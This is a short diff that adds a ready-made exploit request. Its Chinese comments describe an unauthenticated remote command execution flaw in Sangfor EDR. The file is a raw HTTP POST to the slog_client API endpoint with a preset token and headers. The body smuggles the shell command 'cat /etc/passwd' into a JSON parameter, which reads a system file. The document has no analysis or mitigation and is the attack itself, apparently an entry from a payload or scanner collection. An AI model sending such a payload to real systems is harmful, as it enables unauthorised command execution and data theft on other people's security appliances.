@@ -1,0 +1,11 @@
+# 利用【Sangfor EDR远程命令执行漏洞执行命令】-30000644
+# 利用Sangfor EDR远程命令执行漏洞允许未经认证的远程用户执行任意命令。
+POST /api/edr/sangforinter/v2/cssp/slog_client?token=eyJtZDUiOnRydWV9&acid=30000644&bid=hd_tag_m8mv2422 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv2422
+RM-PRO-Token: 3b8e74762912fc128b37062924e57368
+RM-PRO-Time: 1742808359493
+User-Agent: curl/7.83.1
+Content-Type: application/x-www-form-urlencoded
+
+id={"params":"w=123\"'1234123'\"|cat /etc/passwd"}
